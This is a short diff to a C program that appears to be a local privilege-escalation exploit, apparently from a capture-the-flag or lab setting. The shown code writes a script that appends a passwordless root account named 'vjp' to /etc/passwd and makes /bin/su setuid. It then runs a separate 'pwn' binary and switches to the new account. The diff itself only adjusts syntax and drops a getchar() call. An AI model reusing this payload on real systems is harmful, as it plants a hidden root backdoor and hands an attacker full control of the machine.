@@ -214,11 +214,11 @@ int main(int argc,char** argv,char** envp){
     int vjpfd = open("/home/user/vjp",O_CREAT | O_RDWR);
     if(vjpfd < 0)
         errExit("open /home/user/vjp");
-    dprintf(vjpfd,(
+    dprintf(vjpfd,
         "#!/bin/sh\n"
         "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
         "/bin/chmod +s /bin/su"
-    ));
+    );
     close(vjpfd);
     if(chmod("/home/user/vjp",0777))
         errExit("chmod");
@@ -233,6 +233,4 @@ int main(int argc,char** argv,char** envp){
     system("/home/user/pwn");
     system("cat /etc/passwd");
     system("su vjp");
-    getchar();
-
 }
